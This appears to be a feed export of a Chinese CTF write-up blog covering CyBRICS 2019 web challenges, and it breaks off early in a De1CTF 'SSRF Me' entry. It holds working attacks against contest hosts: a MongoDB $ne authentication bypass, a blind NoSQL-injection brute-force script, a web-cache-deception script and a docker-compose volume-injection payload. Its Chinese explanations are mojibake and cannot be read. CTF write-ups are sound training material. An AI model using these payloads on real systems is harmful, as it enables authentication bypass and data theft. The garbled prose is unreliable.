php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡è¿è¡Œmongodbè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ å¦‚ä¸‹è¯­å¥æ¥bypass authã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: &quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥ä¹‹å<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$raw_query = &#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;username&quot;:&quot;admin&quot;&#125;;</span><br></pre></td></tr></table></figure></p><p>PS: $neæ˜¯ä¸ç­‰äºçš„æ„æ€ã€‚è€Œä¸”è™½ç„¶å˜é‡é‡å¤äº†ï¼Œä½†æ˜¯decodeæ—¶å˜é‡åªä¼šæ˜¯æœ€åä¸€æ¬¡çš„èµ‹å€¼ã€‚</p><p>ç™»å½•ä¹‹åå°±å°±ä¼šå‘ç°å¾ˆæ˜æ˜¾æ˜¯è¦ä»<code>filter</code>å‚æ•°å¤„æ„é€ æ³¨å…¥æ¥è·å–flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$gt][0]=$text&amp;filter[$gt][1]=æ³¨å…¥ç‚¹</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæˆ‘è¿˜æ˜¯ä¸æ¸…æ¥šè¿™ä¸ªäºŒç»´æ•°ç»„çš„æ„æ€ï¼Œæ‰€ä»¥åæœŸéœ€è¦è°ƒè¯•ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://173.199.118.226/index.php?filter[$gt][0]=$text&amp;filter[$gt][1]="</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">"password"</span>: <span class="string">'","password":&#123;"$ne":null&#125;,"username":"admin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">"cybrics&#123;7"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        s = chr(i)</span><br><span class="line">        <span class="comment"># print s</span></span><br><span class="line">        r = requests.get(url+res+s, cookies=cookie)</span><br><span class="line">        <span class="comment"># print r.text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"1 has"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += chr(i<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"-----&gt;"</span>,res</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ç›²æ³¨å‹è§£æ³•ï¼Œåé¢è¿˜çœ‹åˆ°æœ‰å¸ˆå‚…ç”¨<a href="https://docs.mongodb.com/manual/reference/operator/aggregation-pipeline/" target="_blank" rel="noopener">èšåˆç®¡é“</a>ç›´æ¥æ„é€ å‡ºäº†payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12</span><br></pre></td></tr></table></figure><p>flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;7|-|15 15 4 7E&gt;&lt;7 |=|_49&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x03-Caesaref-Web-Hard-50-pts"><a href="#0x03-Caesaref-Web-Hard-50-pts" class="headerlink" title="0x03 Caesaref (Web, Hard, 50 pts)"></a>0x03 Caesaref (Web, Hard, 50 pts)</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>Author: Alexander Menshchikov (n0str)</p><p>There is an additional one: Fixaref</p><p>This web resource is highly optimized:</p><p><a href="http://45.77.218.242/" target="_blank" rel="noopener">http://45.77.218.242/</a></p><h3 id="é¢˜ç›®è§£ç­”-2"><a href="#é¢˜ç›®è§£ç­”-2" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><p>é¢˜ç›®å‡ºç°é—®é¢˜ï¼Œbotç›´æ¥å¸¦cookieè®¿é—®äº†ï¼Œæ‰€ä»¥å¯ä»¥è½»æ¾æ‹¿åˆ°cookieï¼Œä¹‹åå¸¦cookieè®¿é—®ç›®æ ‡å³å¯ã€‚</p><h2 id="0x04-Fixaref-Web-Hard-267-pts"><a href="#0x04-Fixaref-Web-Hard-267-pts" class="headerlink" title="0x04 Fixaref (Web, Hard, 267 pts)"></a>0x04 Fixaref (Web, Hard, 267 pts)</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>Author: Alexander Menshchikov (n0str)</p><p>Caesaref recently suffered from a massive data breach. It was so critical that they decided to just start over. Here it goes â€” Fixaref: â€œReliability is Our Gameâ€â„¢Â®.</p><p>This web resource is even more highly optimized:</p><p><a href="http://95.179.190.31/" target="_blank" rel="noopener">http://95.179.190.31/</a></p><h3 id="é¢˜ç›®è§£ç­”-3"><a href="#é¢˜ç›®è§£ç­”-3" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><ol><li>å°±æ˜¯cssæ–‡ä»¶ä¼šè¢«ç¼“å­˜</li><li>ç”±äºç½‘ç«™è·¯ç”±é…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥å°†æŸäº›é¡µé¢åç¼€å˜æˆcssï¼Œç„¶åå°±è¢«ç¼“å­˜äº†ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://95.179.190.31/"</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=nsce9ed7evs05iisp8u0hb41r6"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(text)</span>:</span></span><br><span class="line">tmp = re.search(<span class="string">'value="([a-z0-9]&#123;64&#125;)"'</span>, text)</span><br><span class="line"><span class="keyword">if</span>(tmp):</span><br><span class="line">print(tmp.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">return</span> tmp.group(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"[x] getToken() error!"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ask</span><span class="params">(askData)</span>:</span></span><br><span class="line">tokenRaw = requests.get(url,headers=header).text</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"csrf-token"</span>:getToken(tokenRaw),</span><br><span class="line"><span class="string">"question"</span>:askData,</span><br><span class="line"><span class="string">"submit"</span>:<span class="string">"Ask"</span></span><br><span class="line">&#125;</span><br><span class="line">askRespose = requests.post(url,data=data,headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> askRespose.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">(token)</span>:</span></span><br><span class="line"><span class="comment"># return "http://95.179.190.31/index.php/5am3_flag520.css?csrf-token="+token+"%26flag=1%26a.css"</span></span><br><span class="line"><span class="keyword">return</span> url+<span class="string">"/index.php/&#123;:d&#125;.css?csrf-token=&#123;:s&#125;%26flag=1%26a.css/abc.css"</span>.format(random.randint(<span class="number">1</span>,<span class="number">23333333333</span>),token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url1 = url+<span class="string">"index.php/&#123;:d&#125;.css"</span>.format(random.randint(<span class="number">1</span>,<span class="number">23333333333</span>))</span><br><span class="line">ask(url1)</span><br><span class="line">print(<span class="string">"loading..."</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">tokenRaw = requests.get(url1,headers=header).text</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"Show flag"</span> <span class="keyword">in</span> tokenRaw):</span><br><span class="line">tokenAdmin =getToken(tokenRaw)</span><br><span class="line">print(<span class="string">"loading..."</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">url2 = getFlag(tokenAdmin)</span><br><span class="line">print(url2)</span><br><span class="line">ask(url2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.get(url2.replace(<span class="string">"%26"</span>,<span class="string">"&amp;"</span>)).text</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Bu9s_C4N_83_uN1N73Nd3D!&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x05-Dock-Escape-CTB-Easy-151-pts"><a href="#0x05-Dock-Escape-CTB-Easy-151-pts" class="headerlink" title="0x05 Dock Escape (CTB, Easy, 151 pts)"></a>0x05 Dock Escape (CTB, Easy, 151 pts)</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>Author: George Zaytsev (groke)</p><p>We want you to get a flag from hosting server. Flag path is /home/flag<br><a href="http://95.179.188.234:8080/" target="_blank" rel="noopener">http://95.179.188.234:8080/</a></p><h3 id="é¢˜ç›®è§£ç­”-4"><a href="#é¢˜ç›®è§£ç­”-4" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><p>å½“æ—¶ä¸€ç›´æƒ³æ˜¯å¯åŠ¨ä¹‹åå»åˆ©ç”¨æŸä¸ªtrickå»é€ƒé€¸ï¼Œæ‰€ä»¥ä¸€ç›´å¡åœ¨è¿™å„¿ï¼Œæ¯”å®Œä¹‹åæ‰å‘ç°å…¶å®æ˜¯åœ¨å¯åŠ¨çš„æ—¶å€™çš„é—®é¢˜ã€‚</p><p>ä¸€èˆ¬æ¥è¯´dockeræ˜¯æ— æ³•è¯»å–æ¯æœºçš„æ–‡ä»¶çš„ï¼Œä½†æ˜¯å¦‚æœåœ¨å¯åŠ¨çš„æ—¶å€™åŠ å…¥ä¸€äº›å‚æ•°å°±æœ‰å¯èƒ½å‘¢ä¸ªè§¦å‘é€ƒé€¸ï¼Œä½†æ˜¯æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯å°†å¯¹åº”çš„ç›®å½•æŒ‚è½½åˆ°dockerä¸Šã€‚</p><p>åœ¨ç«¯å£å·å¤„éšä¾¿è¾“å…¥å‘ç°ä¼šè§¦å‘æŠ¥é”™<br><img src="https://i.loli.net/2019/08/11/jPhFiBnEDHKIw9o.png" alt="C3202CF6-8086-4524-812C-42F55D50F1B4.png"></p><p>æ ¹æ®æŠ¥é”™ä¿¡æ¯å‘ç°æ˜¯ä½¿ç”¨äº†<code>docker-compose.yml</code>ï¼Œæ‰€ä»¥æ ¹æ®å¯¹åº”çš„è¯­æ³•æ„é€ payloadå°±è¡Œäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2233:12345\n    volumes:\n      - /home:/ctf #</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ€å¥½ä½¿ç”¨burpæ¥ä¿®åŒ…æ‰“</p><p><img src="https://i.loli.net/2019/08/11/it6X3gW4fhmoBxZ.png" alt="50DB0AB9-8D89-49BF-8205-E378CF61AE70.png"></p><p>ä¹‹åç›´æ¥ä½¿ç”¨client.pyæ¥è¯»flag</p><p><img src="https://i.loli.net/2019/08/11/PJvtoNqpsechr91.png" alt="05E9C920-482C-4F0B-9A7C-69A51DA31398.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;åˆæ˜¯æ‘¸é±¼çš„ä¸€å¤©&lt;/p&gt;
&lt;h2 id=&quot;0x01-Bitkoff-Bank-Web-Easy-50-
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>De1CTF 2019 WEB WP</title>
    <link href="http://zer0yu.github.io/2019/08/11/De1CTF-2019-wp/"/>
    <id>http://zer0yu.github.io/2019/08/11/De1CTF-2019-wp/</id>
    <published>2019-08-11T00:34:05.000Z</published>
    <updated>2019-08-11T01:00:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨å®¶å®…ç€ä¸æƒ³å†™wpï¼Œæ¥å­¦ç¬¬ä¸€å¤©è¡¥ä¸Š</p><h2 id="0x01-SSRF-Me"><a href="#0x01-SSRF-Me" class="headerlink" title="0x01 SSRF Me"></a>0x01 SSRF Me</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>SSRF ME TO GET FLAG.</p><p><a href="http://139.180.128.86/" target="_blank" rel="noopener">http://139.180.128.86/</a></p><h3 id="é¢˜ç›®è§£ç­”"><a href="#é¢˜ç›®è§£ç­”" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span 